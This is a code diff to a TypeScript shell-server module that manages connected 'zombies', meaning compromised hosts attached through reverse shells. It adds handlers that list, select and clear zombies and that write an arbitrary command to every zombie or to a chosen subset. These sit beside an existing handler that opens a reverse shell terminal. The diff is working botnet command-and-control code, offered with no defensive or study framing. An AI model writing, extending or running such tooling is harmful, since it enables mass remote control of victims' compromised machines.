@@ -45,6 +45,31 @@ export default class ShellServerModule extends Module {
             handler: this.handleList
         },
         {
+            arg: `list-selected`,
+            desc: `List all selected zombies.`,
+            handler: this.handleListSelected
+        },
+        {
+            arg: `clear-selected`,
+            desc: `Unselect all selected zombies.`,
+            handler: this.handleClearSelected
+        },
+        {
+            arg: `select=`,
+            desc: `Add a zombie to selected.`,
+            handler: this.handleSelect
+        },
+        {
+            arg: `exec_select=`,
+            desc: `Run a command on each selected zombie.`,
+            handler: this.handleExecSelected
+        },
+        {
+            arg: `exec=`,
+            desc: `Run a command on every zombie.`,
+            handler: this.handleExec
+        },
+        {
             arg: `use=`,
             desc: `Open a reverse shell terminal for the selected zombie.`,
             handler: this.handleUse
@@ -102,6 +127,38 @@ export default class ShellServerModule extends Module {
             const current = this.zombies[id];
             console.log(`id: [${id}] ip: [${current.remoteAddress}:${current.remotePort}]`);
         })
+    }
+
+    public handleListSelected(){
+        if(this.selectedIDs.length === 0){
+            console.log(`\nNO ZOMBIES CONNECTED\n`);
+            return;
+        }
+        this.selectedIDs.map(id => {
+            const current = this.zombies[id];
+            console.log(`id: [${id}] ip: [${current.remoteAddress}:${current.remotePort}]`);
+        })
+    }
+
+    public handleClearSelected(){
+        this.selectedIDs = [];
+    }
+
+    public handleSelect(id){
+        if(!this.zombies[id]) {
+            cmdError(`Error, no zombie with id '${id}' found.`);
+            return;
+        }
+
+        this.selectedIDs.push(id);
+    }
+
+    public handleExecSelected(cmd){
+        this.selectedIDs.map(id => this.zombies[id].write(cmd));
+    }
+
+    public handleExec(cmd){
+        this.getTcpIds().map(id => this.zombies[id].write(cmd));
     }
 
     public handleUse(id){
